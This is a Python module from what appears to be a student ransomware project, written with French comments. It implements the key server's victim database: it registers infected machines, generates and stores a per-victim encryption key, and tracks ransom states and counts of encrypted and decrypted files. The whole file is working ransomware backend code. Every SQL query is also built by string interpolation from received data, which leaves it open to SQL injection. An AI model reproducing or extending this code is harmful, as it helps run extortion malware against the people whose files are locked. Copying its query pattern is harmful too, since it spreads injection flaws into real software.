import sqlite3
import utile.security as secu


def connect_to_DB(path="../serveur_cles/data/victims.sqlite"):
    """
    :param path:chemin vers l'endroit où se trouve la bd
    :return:retourne la connexion et le curseur pour exécuter les commande sql
    """
    # Initialisation de ces variables pour eviter un crash en cas d'erreur de connexion
    connection = None
    cursor = None

    try:
        # Essaie de se connecter vers la BD
        connection = sqlite3.connect(path)
        cursor = connection.cursor()

    except sqlite3.Error as e:
        # Si échec de la connexion -> affichage de l'erreur
        print(f"Une erreur est survenue dans la connexion: {e}")

    return connection, cursor


def select(request, nom_table, condition=None, conn=None, cursor=None):
    """
    !!! Fonction générique qui n'a pas été tant utilisé que ça!!!
    cette fonction s'occupe de creer une requête sql qui return un string si conn et cursor si ne sont pas renseigné
    pour l'utiliser plus tard ou l'executer directement si le conn et cursor sont renseigné
    :param request:si request est une liste, il va séparer les éléments correctement
    (si[os,hash]--> select os, hash from...)
    :param nom_table:nom de la table à selectionner (from victims....)
    :param condition:renseigne la condition WHERE si non renseigné --> ignoré
    :param conn: objet sqlite relative à la connection de la bd (carte d'identité)
    :param cursor:afin d'exécuter nos requêtes, nous allons utiliser le cursor recupéré en faisant appel à la fonction:
    connection = sqlite3.connect(path)
    :return: si conn et cursor renseigné: execution la commande sql
            sinon: retourne la commande sql en string
    """
    # Initialisation du début de la requête
    query = f"SELECT "

    # Si request est une liste
    # Récupération de chaque élément de la liste et ajout dans la string query en séparant par des virgules
    #  + Suppression des 2 derniers caractères pour éviter d'avoir une virgule en trop et créer une faute de syntaxe
    # Dans la requête SQL
    if type(request) is list:
        for x in request:
            query += x + ", "
        query = query[0:-2]
    # Si request n'est pas une liste, elle est simplement ajouté à la query
    # request = victim => SELECT victim
    else:
        query += request
    # Si la condition n'est pas None
    # Ajout du nom de la table + un WHERE + la condition
    if condition:
        query += " FROM " + str(nom_table) + " WHERE " + condition
    # Sinon simple ajout du FROM avec le nom de la table
    else:
        query += " FROM " + str(nom_table)
    # Si conn et cursor sont précisé l'exécution se fera en une traite
    # retourne le résultat de la requête
    if conn and cursor:
        execute_query(conn, cursor, query)
    # Sinon, retourne la requête SQL sous forme de string prête à être utiliser
    else:
        return query


def insert(table, value, conn=None, cursor=None):
    """
    !!! Fonction générique qui n'a pas été tant utilisé que ça!!!
    Cette fonction construit une requête SQL de type insert prête à être utilisée
    Ou directement exécutée par la fonction
    :param table: table dans laquelle il faut ajouter des valeurs
    :param value: valeur à ajouter dans la table
    :param conn: objet sqlite relative à la connection de la bd (carte d'identité)
    :param cursor:afin d'exécuter nos requêtes, nous allons utiliser le cursor recupéré en faisant appel à la fonction:
    connection = sqlite3.connect(path)
    :return: si conn = none et cursor = none:
                                    La requête SQL sous forme de string
                             sinon :
                                    Ne retourne rien
    """
    # Initialisation du début de la requête
    query = f"INSERT INTO {table} ("
    # Ici les éléments sont obligé d'être dans une liste
    # Parcourt de toutes les valeurs pour les inserer dans la requête en les séparant par des virgules
    # Suppression des deux derniers caractères pour éviter une virgule en trop + ajout des parenthèses
    for x in value:
        query += x + ", "
    query = query[0:-2] + ") VALUES ("

    # Pareil qu'au dessus mais sans le "values"
    for x in value:
        query += str(value[x]) + ", "
    query = query[0:-2] + ")"

    # Si conn et cursor sont mentionné : exécution de la requête
    if conn and cursor:
        execute_query(conn, cursor, query)

    # Sinon retourne la requête SQL sous forme de string prête à être utilisée
    else:
        return query


def update(table_name, tuple_name, new_value, id_tuple=None, conn=None, cursor=None):
    """
    !!! Fonction générique qui n'a pas été tant utilisé que ça!!!
    cette fonction creer une requête de type update avec ou sans condition
    :param table_name:nom table à mettre à jour
    :param tuple_name:nom tuple à mettre à jour
    :param new_value:nouvelle valeur pour le(s) tuple(s)
    :param id_tuple:id utilisé dans la condition
    :param conn: objet sqlite relative à la connection de la bd (carte d'identité)
    :param cursor:afin d'exécuter nos requêtes, nous allons utiliser le cursor recupéré en faisant appel à la fonction:
    connection = sqlite3.connect(path)
    :return: La requête SQL sous forme de string
    """
    # Si un id est précisé -> mdoficiation sur une seule tuple
    # Avec le nom de la table, valeur )à changer, la nouvelle valeur et l'id de la ligne
    if id_tuple:
        query = f"UPDATE {table_name} SET {tuple_name} = '{new_value}' WHERE id = {id_tuple}"
    # Sinon toutes les tuples en question de la table seront modifiées
    else:
        query = f"UPDATE {table_name} SET {tuple_name} = '{new_value}'"
    # Si conn et cursor sont mentionné : exécution de la requête
    if conn and cursor:
        execute_query(conn, cursor, query)
    # Sinon retourne la requête SQL sous forme de string prête à être utilisée
    else:
        return query


def get_victim_list(path="../serveur_cles/data/victims.sqlite"):
    """
    cette fonction construit une requête sql qui demande toutes les victimes de la BD
    avec leur fichier chiffré/déchiffré correspondant
    :param path: le chemin de la base de données
    :return: 3 liste contenant les id,hash,os,disks,state et nombre de fichier chiffré ou déchiffré ou rien en fonction
    de l'état de la victime
    """
    # Connexion à la BD
    conn, cursor = connect_to_DB(path)
    # Divise les requêtes en 3
    # Une pour récupérer les victimes avec état PENDING en faisant un join sur les fichiers CHIFFRES
    # Une pour récupérer les victimes avec état PENDING en faisant un join sur les fichiers DECHIFFRES
    # Et le reste pour ne pas prendre les fichiers chiffré/déchiffré

    # Pending
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, e.nb_file FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim JOIN encrypted e ON v.id_victim = e.id_victim WHERE s.state = 'PENDING'"
    result_pending = execute_query(conn, cursor, query)

    # PROTECTED
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, de.nb_file FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim JOIN decrypted de ON v.id_victim = de.id_victim WHERE s.state = 'PROTECTED'"
    result_protected = execute_query(conn, cursor, query)

    # Autre
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, null FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim WHERE s.state NOT IN ('PROTECTED', 'PENDING')"
    result_other = execute_query(conn, cursor, query)
    # Déconnexion de la BD
    disconnect_from_DB(conn)

    return result_pending, result_protected, result_other


def change_state(recv_data, path="../serveur_cles/data/victims.sqlite"):
    """
    cette fonction change l'état d'une victime dans le ransomware si et seulement l'état était PENDING ou CRYPT
    :param path: le chemin de la base de données
    :param recv_data: le dictionnaire CHANGE_STATE qui permet de récupérer l'id concerné
    """
    # Connexion à la BD
    conn, cursor = connect_to_DB(path)
    # création de la requête SQL pour récupérer l'état de la victime
    query = f"SELECT s.state FROM states s WHERE id_victim = {recv_data['CHGSTATE']}"
    # Exéxcution de la requête pour récupérer l'état de la victime
    # L'état ne sera modifié que si l'état de la victime est PENDING ou CRYPT
    if (execute_query(conn, cursor, query))[0][0] in ['PENDING', 'CRYPT']:
        # Création de la requête UDPATE
        query = f"UPDATE states SET state ='{recv_data['STATE']}' WHERE id_victim = {recv_data['CHGSTATE']}"
        # Execution
        execute_query(conn, cursor, query)
        # Déconnexion de la BD
        disconnect_from_DB(conn)


def get_history(recv_data, path="../serveur_cles/data/victims.sqlite"):
    """
    Cette fonction récupère l'historique d'une victime d'un ransomware au moyen de la requête ci-dessous
    :param recv_data: le dictionnaire HISTORY_REQ qui permet de récupérer l'id concerné
    :param path: le chemin de la base de données
    :return: le résultat de la requête, l'historique de la victime x
    """
    # Connexion à la BD
    conn, cursor = connect_to_DB(path)
    # Exécution de la requête pour vérifier l'état de la victime concernée
    condition = execute_query(conn, cursor, f'SELECT state FROM states WHERE id_victim = {recv_data["HIST_REQ"]}')

    # Si l'état est PENDING : création d'une requête où on récupère la victime accompagné de ses fichiers chiffrés
    if condition[0][0] == 'PENDING':
        query = f"SELECT s.id_state, s.datetime, s.state, e.nb_file FROM states s JOIN encrypted e ON s.id_victim = " \
                f"e.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "

    # Si l'état est PROTECTED : création d'une requête où  on récupère la victime accompagné de ses fichiers chiffrés
    elif condition[0][0] == 'PROTECTED':
        query = f"SELECT s.id_state, s.datetime, s.state, de.nb_file FROM states s JOIN decrypted de ON s.id_victim = "\
                f"de.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "

    # SiNON : création d'une requête où  on récupère la victime accompagné d'aucun fichiers (performances)
    else:
        query = f"SELECT s.id_state, s.datetime, s.state, null FROM states s " \
                f"WHERE s.id_victim = {recv_data['HIST_REQ']}"
    # Exécution de la requête + déconnexion
    result = execute_query(conn, cursor, query)
    # Déconnexion de la BD
    disconnect_from_DB(conn)
    return result


def initialize_req(recv_data):
    """
    Cette fonction récupère les données du paquet initialize_req pour introduire la victime dans la BD.
    Si la victime existe déjà, les informations sont simplement récupérées
    Si la victime n'existe pas, la victime est ajoutée à toutes les tables avec une key aléatoire auto-générée
    :param recv_data: paquet initialize_req reçue depuis le ransomware transisté par serveur frontal, récupéré et traité
    par le serveur de clés
    :return: une liste contenant l'id, la clé et l'état de la victime
    """
    # Connexion à la BD
    conn, cursor = connect_to_DB()
    # Si la victime n'existe pas dans la BD, enregistrement dans toutes les tables + génération de clé de chiffrement
    if not execute_query(conn, cursor, f'SELECT hash, os, disks FROM victims WHERE hash ="'
                                       f'{recv_data["INITIALIZE"]}"'):
        # Insertion de la victime dans la table victime
        query_victims = f'INSERT INTO victims(hash, os, disks, key )VALUES("' \
                        f'{recv_data["INITIALIZE"]}", "{recv_data["OS"]}", "{recv_data["DISKS"]}", ' \
                        f'"{secu.generated_encrypted_key()}") '
        # execution de la requête
        execute_query(conn, cursor, query_victims)
        # récupération de l'id de la victime pour pouvoir les insérer en tant que clé étrangère dans les autres
        # tables
        victim_identity = execute_query(conn, cursor,
                                        f'SELECT id_victim FROM victims '
                                        f'WHERE hash ="{recv_data["INITIALIZE"]}"')
        # Insertion de la victime dans states encrypted et decrypted avec l'id de la victime en clé secondaire
        query_states = f'INSERT INTO states(id_victim, state)VALUES({victim_identity[0][0]}, "INITIALIZE")'
        query_encrypted = f'INSERT INTO encrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'
        query_decrypted = f'INSERT INTO decrypted(id_victim, nb_file)VALUES({victim_identity[0][0]}, "0")'

        # Exécution des requêtes
        execute_query(conn, cursor, query_states)
        execute_query(conn, cursor, query_encrypted)
        execute_query(conn, cursor, query_decrypted)
    # Récupération des infos de la victime
    # Ne génère jamais d'erreur car la victime est toujours sensé se trouver en BD à ce stade ci
    list_info = execute_query(conn, cursor,
                              f'SELECT v.id_victim, v.key, s.state FROM victims v JOIN states s ON '
                              f's.id_victim = v.id_victim WHERE v.hash = "{recv_data["INITIALIZE"]}"')
    return list_info


def execute_query(connection, cursor, query):
    """
    cette fonction execute les commandes sql
    :param connection: objet sqlite relative à la connection de la bd (carte d'identité)
    :param cursor:afin d'exécuter nos requêtes, nous allons utiliser le cursor recupéré en faisant appel à la fonction:
    connection = sqlite3.connect(path)
    :param query:est la commande sql à executer
    :return:si con et cursor renseigné: execution la commande sql
                                 sinon: retourne la commande sql en string
    """
    # Initialisation d'une variable pour eviter un crash en cas d'erreur d'execution
    result = None
    try:
        #  Essaie : exécution de la commande
        cursor.execute(query)  # execute la commande sql
        connection.commit()

        if query[0:6] == "SELECT":  # detecte si c'est un "select" pour faire un fetchall (récupère les informations)
            result = cursor.fetchall()

    except sqlite3.Error as e:
        # S'il y a une erreur affichage
        print(f"Erreur survenue dans l'execution de la requête: {e}")

    return result


def disconnect_from_DB(connection):
    """
    cette fonction s'occupe de déconnecter la bd
    :param connection: objet sqlite relative à la connection de la bd (carte d'identité)
    """
    try:
        # Essaie de se déconnecter
        connection.close()

    except sqlite3.Error as e:
        # Affichage de l'erreur (en cas d'erreur)
        print(f"Une erreur est survenue dans la déconnexion: {e}")  # detecte l'erreur à la deconnection
